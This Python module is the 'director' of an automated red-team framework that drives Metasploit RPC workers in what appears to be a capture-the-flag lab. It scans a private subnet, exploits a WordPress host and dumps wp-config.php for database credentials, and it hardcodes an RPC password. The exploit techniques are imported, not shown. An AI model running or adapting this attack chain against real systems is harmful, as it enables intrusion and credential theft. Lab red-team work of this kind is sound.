# -*- coding: utf-8 -*-
"""
Red Team Director
"""

import sys
from time import sleep
import json

from .workers import MsfRpcWorker
# from .actionsold import ExecuteExploitAction
# from .actions import ExecuteSessionCommandAction
from .actions import Action
from .errors import ActionExecutionError
from .errors import ActionTimeoutError
from .tactics import DumpWordpressConfigTechnique
from .tactics import ExploitationOfRemoteServicesTechnique
from .tactics import SynNetworkServiceScanningTechnique


# _appconfig = None
# _msfrpc_hosts = None
# _log_director = None
_workers = {}
_exit = False

# enumerate_network = Action(
#     phase=1,
#     name='Enumerate network',
#     technique=PingNetworkServiceScanningTechnique(),
#     targets=['172.19.0.7/29'],
#     goals={
#         'goals': [
#             {
#                 'name': 'any-host-discovered',
#                 'assert_host': {
#                     'host': '@NOTNULL@',
#                 }
#             }
#         ]
#     }
# )
discover_webapps = Action(
    phase=1,
    name='Discover web apps',
    technique=SynNetworkServiceScanningTechnique(),
    targets=['172.19.0.7/29'],
    timeout=300,
    goals={
        'goals': [
            {
                'name': 'services-http',
                'assert_service': {
                    'name': 'http',
                }
            },
            {
                'name': 'services-https',
                'assert_service': {
                    'name': 'https',
                }
            },
        ]
    }
)
wordpress_exploit = Action(
    phase=4,
    name='Exploit Wordpress vulnerability',
    technique=ExploitationOfRemoteServicesTechnique(),
    targets=['172.19.0.7'],
    goals={
        'goals': [
            {
                'name': 'wordpress-session',
                'assert_session': {
                    'host': '@TARGET@',
                }
            }
        ]
    }
)
wordpress_dump_config = Action(
    phase=6,
    name='Dump Wordpress credentials',
    technique=DumpWordpressConfigTechnique(),
    targets_query={
        'session': {
            'host': '172.19.0.7',
        }
    },
    goals={
        'goals': [
            {
                'name': 'wordpress-db-creds',
                'assert_loot': {
                    'host': '@TARGET@',
                    'ltype': 'linux.enum.conf',
                    'name': 'wp-config.php',
                }
            }
        ]
    }
)


def main(appconfig, msfrpc_hosts):
    """Main entry point allowing external calls
    Args:
      args ([str]): command line parameter list
    """
    global _appconfig, _msfrpc_hosts, _log_director
    _appconfig = appconfig
    _msfrpc_hosts = msfrpc_hosts
    _log_director = _appconfig.log_director
    _log_director.debug("Starting Director...")
    bootstrap_workers()
    while not _exit:
        loop()
    _log_director.info("Director shutdown complete")


def bootstrap_workers():
    """Configure initial set of workers from environment
    """
    for host in _msfrpc_hosts:
        worker = MsfRpcWorker(
            host=host.split(':')[0],
            port=int(host.split(':')[-1]) if ':' in host else 55553,
            username='director',
            password='directorU123',
            ssl=False,
            appconfig=_appconfig
        )
        _workers[worker.uid] = worker
        worker.client()
        _log_director.debug('Worker connection test succeeded')


def loop():
    """Event loop
    """
    _appconfig.event_dispatcher.send(
        signal='operations',
        sender=__name__,
        msg='Game started',
        obj={}
    )
    for id, worker in _workers.items():
        _log_director.debug('Processing worker {}'.format(id))
        # print(worker.client().call('db.loots', opts=[{}]))
        action = plan_next_action(worker)
        execute_action(worker, action)
        report(worker)
    turn_sleep(_appconfig.turn_sleep)


def plan_next_action(worker):
    flag = _appconfig.targets['wordpress_db_password']
    if flag['flag_value']:
        _log_director(f'The flag has been captured')
        _log_director(json.dumps(flag))
        sys.exit(0)
    # XXX we need a tree here OoO
    if wordpress_dump_config.verify_goals(worker):
        print('\n\n******************\n\nFLAG CAPTURED\n\n*******************\n')
        sys.exit(0)
    elif wordpress_exploit.verify_goals(worker):
        return wordpress_dump_config
    elif discover_webapps.verify_goals(worker):
        return wordpress_exploit
    else:
        return discover_webapps
    


def execute_action(worker, action):
    _log_director.info(f'\n\n\nExecuting action {action}...')
    try:
        action.execute(worker)
        _log_director.info(f'Action outcome for {action}: {action.verify_goals(worker)}\n\n\n')
    except ActionExecutionError:
        _log_director.warning('Failed to execute exploit action')
    except ActionTimeoutError:
        _log_director.warning('Action timed out')


def report(worker):
    _log_director.info('Report')


def turn_sleep(seconds):
    _log_director.info('Waiting %s seconds...', seconds)
    sleep(seconds)
